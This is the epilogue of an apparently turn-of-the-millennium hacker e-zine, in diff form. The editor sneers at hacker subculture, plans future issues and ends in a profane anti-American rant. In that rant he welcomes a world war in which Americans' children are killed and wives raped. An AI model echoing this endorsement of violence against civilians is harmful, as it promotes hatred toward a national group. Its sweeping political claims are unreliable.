+never actually done *anything* requiring any intelligence. So why do people 
+know him? People know him because he has taken the time to categorize a whole
+bunch of exploits into the operating systems they affect, and put it on a 
+webpage. This means that various clueless individuals have a one-stop resource
+for clicking on the operating system they want to hack, downloading and 
+running the exploit they don't understand, and getting illegitimate access to
+some-one else's system in a matter of seconds. And because gov-boi provides
+this service - he is "elite".
+
+And the point is: this is what is required to be an important person in this
+institution. This is what one HAS to do. Know the right people, hang in the
+right places, have the right exploits - and you're elite. Without even having
+to be able to do anything requiring an IQ above that of a piece of cheddar
+cheese. And even in the higher ranks of the hacking scene, where everything is
+supposed to be different - it's the same old shit. How many people will fight
+to be the new editor of Phrack when route retires (or when some-one finally
+kills him :P), not because they have a vision for Phrack's future, or because 
+they have a good style of writing, or because they *honestly* believe they 
+could do a better job than the other candidates, but because they want to be 
+the Editor of PHRACK and thus ELITE.
+
+I want to hack. Not break into systems, Not look cool on IRC, Not kiss ass to
+get into "leet hacker groups", I want to HACK: to play around with stuff on my
+system, learn how things work better, try out new ideas just for the sake of
+trying out new things: without any extra "culture" bullshit. As soon as I
+finish writing this epilogue, I want to take a stab at using the JNI to have
+Java-controlled low-level packet creation. I want to audit every daemon on
+Tucows, find all the buffer overflow bugs I can, code exploits for them, and
+then delete thce exploits as soon as I get them to work! I want to do 
+pointless arb shit that will benefit me and nobody else, and never apply
+anything practically, just for the sake of extra arbness. ;P
+
+Fuck Subculture. What a dumb idea. :) And while we're at it, fuck culture,
+it's also just another obstacle in the way of individualism. And finally, fuck
+YOU: For being in a subculture, for reading this zine instead of finding out
+stuff yourself (which will prob be better anyway) and (most importantly) for
+not sending me free beer. :P
+
+And so, as you can imagine, I've had a great deal of trouble deciding wether
+or not to stay "in" the scene, wether or not to continue Forbidden Knowledge
+and wether or not to just drop my current handle and move on. And ultimately
+I've decided: No, I haven't changed the opinions of enough people to call it
+quits just yet. I was gonna drop out of the scene totally, but talking about
+it with NtWaK0 and Moe1 and re-reading my own cyberpunk.txt from FK4 changed
+my mind. I'm still, however, going to carry on with my new idea of just 
+screwing around with stuff that interests me and not necesarilly taking time
+to implement all my ideas, whilst keeping a minimal connection with "the 
+scene", which means that FK *will* continue, although it will probably be 
+less orderly, more abstract and won't explain as much to the newbie reader 
+sector. But that doesn't really matter - I'm not terribly fond of any form
+of order what-so-ever, and the newbies will just have to go and get smarter
+or something. :) Oh yeh, I also might wander off what many of you would call
+"hacking" more often, but if you don't *still* call what I'm covering 
+hacking, yer probably not the kind of reader we want anyway.
+
+Also, through-out most of 2000 and early 2001, there is going to be somewhat
+of an FK go-slow. I have a lot of things ahead of me: my final year of school,
+and starting the company Pneuma and I want to get running in 2001. Also, much
+of 2000 will be devoted to developing the AI that our company will be selling
+- so my schedule is quite packed. Ultimately, the more articles I get, the
+less the go-slow will be noticed. And if I get enough articles (as I did with
+this issue for a change :P), you probably won't even notice.
+
+Yeap, a year has gone by and there are some things that need to be changed,
+but I think we grew pretty well. Also note that as from sometime early next
+year, all feedback and article submissions should be sent to my new addy,
+which will be wyze1@sexdrugsunix.org
+
+So FK will probably continue until about 2025 when World War 3 breaks out, y0.
+Heh, I can see it now: The USA vs Everybody else on the planet. :-P But thats
+cool - I'd love having the opportunity to re-build society once its been
+nuked to oblivion and I also think that a war like that is *exactly* what the
+USA needs to slap some sense into it. Think about it: they are constantly
+"saving" other countries from attack, but they have never been attacked on
+their *own* land, had people come into *their* house, waste *their* kids and
+rape *their* wives. And I think that's what they need to realize exactly what
+they're doing to other people.
+
+Look at the undeclared war between South Africa and Angola in the seventies -
+I'm sure one in every 5 South African readers knows somebody who died in that
+war. Now, it is publically admitted that the war happened, and that actually,
+the war was between the USA and Cuba, each supplying SA and Angola
+respectively with equipment - Yes, it was the USA valiantly bashing those
+horrible commie scum again. Go Fucking Go. But the point is - the issue of the
+war is in the open now - South Africa admits to it, Angola admits to it, Cuba
+admits to it, and the USA... *still* denies that they were responsible for
+MORE death in OTHER people's countries.
+
+I am sorry, but America is the fucking *king* of hypocrisy: "Ooh, look at all
+the racist South African scum, what a crap country!" Hello?!! HOW many Native
+Americans are in powerful positions in the USA? Hmm.. *I* don't know of any -
+Perhaps that could be because they WASTED 90% of them a hundred years ago, and
+those that we *DO* have we treat like *SHIT*. So children, *learn* from
+America's wisdom - don't discriminate, kill. *Sigh* What a crock of shit. The
+USA is probably one of THE most racist countries around. The fucking mixed
+marriages act is still in place in Alabama, The USA has *never* had anything
+*but* a white president, and ultimately, when it comes down to being *nice* 
+to and *respecting* other races, attitudes in SA are FAR less anal retensive. 
+
+I could go on for ages about other reasons why America can suck my dick, like
+the fact that the US hacking scene think everything revolves around them and
+them only, but I won't. I've wasted too much space with this weird
+stream-of-conscious epilogue already, and just the thought of having to
+mention *that* country or *that* lame subculture one more time makes me 
+nauseous. Peace...
+
+                 wyze1@sexdrugsunix.org /-=-/ pneuma@beer.com
+       We don't suffer from Insanity - We enjoy every minute of it ;-)
